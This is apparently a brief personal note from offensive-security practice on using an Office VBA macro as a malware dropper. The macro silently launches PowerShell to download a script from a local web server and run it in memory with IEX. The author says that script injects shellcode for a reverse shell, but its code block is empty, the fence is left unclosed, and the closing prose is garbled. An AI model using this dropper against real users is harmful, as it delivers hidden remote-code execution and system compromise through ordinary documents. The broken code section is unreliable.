# Using macro as dropper

```macro
Sub MyMacro()
	Dim str As String
	str="powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.122.1:8000/file.ps1') | IEX"
	Shell str,vbHide
End Sub
```

Now in the powershell file we will execute our shellcode fully inside memory.
```powershell

Now as usual above code does inject and gives back a reverse shell but in macro it is not working and I spend like 2 hrs thinking it was my mistake. By be macro works differently so perhaps thats to explore the next day.
